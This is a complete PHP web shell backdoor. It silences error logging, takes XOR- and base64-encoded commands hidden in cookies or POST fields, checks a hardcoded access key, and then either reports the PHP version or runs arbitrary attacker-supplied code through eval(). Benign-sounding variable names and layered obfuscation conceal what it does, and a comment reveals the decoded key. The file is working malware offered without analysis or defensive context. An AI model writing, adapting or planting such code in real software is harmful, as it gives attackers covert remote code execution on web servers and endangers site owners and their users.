<?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);

function key_getter()
{
    return base64_decode("UAMQV1oLEgBLUAsHE11SXwAPSlNVVA5CUwELU11GRlgBWFIH");
}

function basic_xor($left, $right)
{
    return $left ^ $right;
}

function xor_strings_repeating($left, $right)
{
    $final_xor = "";

    for ($i=0; $i<strlen($left) ;) {
        for ($j=0; $j<strlen($right) && $i<strlen($left); $j++, $i++) {
            $xor_result = ord($left[$i]) ^ ord($right[$j]);
            $final_xor = $final_xor . chr($xor_result);
        }
    }
    return $final_xor;
}

function remove_letter($data, $key)
{
    return @unserialize(decode_with_key($data, $key));
}

function decode_with_key($sub_data, $sub_key)
{
    return xor_strings_repeating(
        xor_strings_repeating(
            $sub_data,
            // valeur toujours = base64_decode("UAMQV1oLEgBLUAsHE11SXwAPSlNVVA5CUwELU11GRlgBWFIH") ^ 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'
            // = 4ef63abe-1abd-45a6-913d-6fb99657e24b
            basic_xor(key_getter(), 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe')
        ),
        $sub_key) ;
}

$approvals = False;

foreach ($_COOKIE as $cookie_one=>$cookie_two)
{
    $approvals = $cookie_two;
    $manager_invitation = $cookie_one;
    $approvals = remove_letter(base64_decode($approvals), $manager_invitation) ;

    if ($approvals) {
        break;
    }
}

if (!$approvals) {
    foreach ($_POST as $contribute=>$research) {
        $approvals = $research;
        $manager_invitation = $contribute;
        $approvals = remove_letter(base64_decode($approvals), $manager_invitation);
        if ($approvals) {
            break;
        }
    }
}

if (!isset($approvals['ak']) || !(basic_xor(key_getter(), 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe')) == $approvals['ak']) {
    $approvals = Array();
} else {
    switch ($approvals['a']){
        case "i":
            $array = Array();
            $array['pv'] = @phpversion();
            $array['sv'] = '1.0-1';
            echo @serialize($array);
            break;
        case "e":
            eval($approvals['d']);
            break;
    }
    exit();

}